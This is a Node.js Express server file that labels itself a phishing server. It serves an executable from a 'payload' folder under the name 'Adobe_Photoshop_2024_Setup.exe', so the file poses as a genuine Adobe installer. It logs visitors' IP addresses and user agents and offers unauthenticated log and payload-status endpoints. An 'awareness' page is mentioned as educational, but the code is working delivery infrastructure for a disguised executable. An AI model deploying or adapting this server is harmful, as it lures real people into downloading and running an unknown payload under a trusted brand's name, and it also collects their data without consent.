const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Setup views + static
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use('/public', express.static(path.join(__dirname, 'public')));

// Ensure logs exist
const LOG_FILE = path.join(__dirname, 'click_log.txt');
if (!fs.existsSync(LOG_FILE)) {
    fs.writeFileSync(LOG_FILE, '=== Phishing Attack Log ===\n', 'utf8');
}

// Helper: append log
function appendLog(line) {
    const entry = `[${new Date().toISOString()}] ${line}\n`;
    fs.appendFileSync(LOG_FILE, entry, 'utf8');
    console.log(entry.trim());
}

// --- Routes ---

// Home / download page
app.get('/', (req, res) => {
    const ip = req.ip || req.connection.remoteAddress;
    const ua = req.headers['user-agent'] || 'unknown';
    appendLog(`PAGE_VISIT | IP: ${ip} | UA: ${ua}`);
    res.render('index', { host: req.get('host') });
});

// Serve the EXE file directly (no ZIP)
app.get('/download', (req, res) => {
    const exePath = path.join(__dirname, 'payload', 'Photoshop_Setup.exe');
    const ip = req.ip || req.connection.remoteAddress;
    const ua = req.headers['user-agent'] || 'unknown';
    
    appendLog(`DOWNLOAD_REQUEST | IP: ${ip} | UA: ${ua}`);
    
    if (fs.existsSync(exePath)) {
        // Set headers for EXE download
        res.setHeader('Content-Type', 'application/octet-stream');
        res.setHeader('Content-Disposition', 'attachment; filename="Adobe_Photoshop_2024_Setup.exe"');
        
        res.download(exePath, 'Adobe_Photoshop_2024_Setup.exe', err => {
            if (err) {
                appendLog(`DOWNLOAD_ERROR | ${err.message}`);
            } else {
                appendLog(`DOWNLOAD_SERVED | IP: ${ip} | File: Adobe_Photoshop_2024_Setup.exe`);
            }
        });
    } else {
        appendLog(`DOWNLOAD_FAILED | Photoshop_Setup.exe not found at ${exePath}`);
        res.status(404).send(`
            <h1>Download Not Available</h1>
            <p>The installer is being prepared. Please try again later.</p>
            <a href="/">Go Back</a>
        `);
    }
});

// Awareness page (shown after attack for education)
app.get('/awareness', (req, res) => {
    res.render('awareness');
});

// Admin logs view
app.get('/logs', (req, res) => {
    let content = '';
    if (fs.existsSync(LOG_FILE)) {
        content = fs.readFileSync(LOG_FILE, 'utf8');
    }
    const lines = content.split('\n').slice(-100).join('\n');
    res.render('logs', { log: lines });
});

// API endpoint to check if payload exists
app.get('/api/status', (req, res) => {
    const exePath = path.join(__dirname, 'payload', 'Photoshop_Setup.exe');
    res.json({
        payload_ready: fs.existsSync(exePath),
        payload_type: 'exe',
        filename: 'Adobe_Photoshop_2024_Setup.exe',
        server_time: new Date().toISOString()
    });
});

// Start server
app.listen(PORT, () => {
    console.log('');
    console.log('='.repeat(55));
    console.log('    PHISHING SERVER STARTED');
    console.log('='.repeat(55));
    console.log('');
    console.log(`  🌐 Website:  http://localhost:${PORT}`);
    console.log(`  📥 Download: http://localhost:${PORT}/download`);
    console.log(`  📊 Logs:     http://localhost:${PORT}/logs`);
    console.log(`  📋 Status:   http://localhost:${PORT}/api/status`);
    console.log('');
    console.log('  📦 Payload:  payload/Photoshop_Setup.exe');
    console.log('');
    console.log('='.repeat(55));
    console.log('');
});
